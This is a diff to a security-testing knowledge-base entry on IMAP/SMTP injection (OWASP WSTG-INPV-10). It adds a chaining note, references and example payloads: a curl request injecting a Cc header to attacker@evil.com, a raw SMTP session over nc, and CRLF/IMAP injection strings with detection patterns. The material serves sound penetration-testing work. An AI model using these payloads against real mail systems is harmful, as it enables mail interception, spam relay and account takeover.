@@ -10,7 +10,8 @@ tech_stack: []
 cwe_ids: [CWE-601]
 chains_with: [wstg-inpv-02, wstg-sess-05]
 prerequisites: [wstg-info-01]
-severity_boost: {}
+severity_boost:
+  wstg-inpv-02: "SMTP/IMAP command injection can insert an unsanitized script payload into a stored email body/subject that a webmail client later renders without sanitization, achieving persistent Stored XSS inside the mailbox UI = Critical (Webmail Session/Account Takeover)"
 ---
 
 # wstg-inpv-10
@@ -319,6 +320,28 @@ QUIT
 
 ---
 
+## Example Commands/Payloads
+
+```bash
+# CC header injection via contact form
+curl -s -X POST "https://{target}/contact" \
+  --data-urlencode "email=test@test.com
+Cc:attacker@evil.com" \
+  --data-urlencode "message=test"
+
+# Raw SMTP command injection over a direct socket
+printf 'HELO test\r\nMAIL FROM:<test@test.com>\r\nRCPT TO:<victim@target.com>\r\nDATA\r\nSubject: test\r\n\r\nbody\r\n.\r\nQUIT\r\n' | nc {target} 25
+```
+
+| Payload | Technique | Detection Pattern |
+| --- | --- | --- |
+| `test@test.com%0ACc:attacker@evil.com` | CC header injection | Extra `Cc:` header present in the delivered email source |
+| `test@test.com%0D%0ABcc:attacker@evil.com` | BCC injection | Extra `Bcc:` header present in delivered email |
+| `test"\r\nA001 LOGOUT\r\n` | IMAP command injection | `A001 OK LOGOUT` in server response |
+| `\r\n\r\nInjected body` | Header/body separator injection | Injected content rendered outside the intended field |
+
+---
+
 ## Remediation
 
 ```python
@@ -395,6 +418,13 @@ $headers .= "Reply-To: " . sanitize_email_header($email) . "\r\n";
 | **CWE-93** | Improper Neutralization of CRLF Sequences                   |
 | **CWE-88** | Improper Neutralization of Argument Delimiters in a Command |
 
+
+---
+
+## References
+
+- [OWASP WSTG - WSTG-INPV-10: Testing for IMAP/SMTP Injection](https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/07-Input_Validation_Testing/10-Testing_for_IMAP_SMTP_Injection)
+- [PayloadsAllTheThings - Email Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Email%20Injection)
 
 ---
 
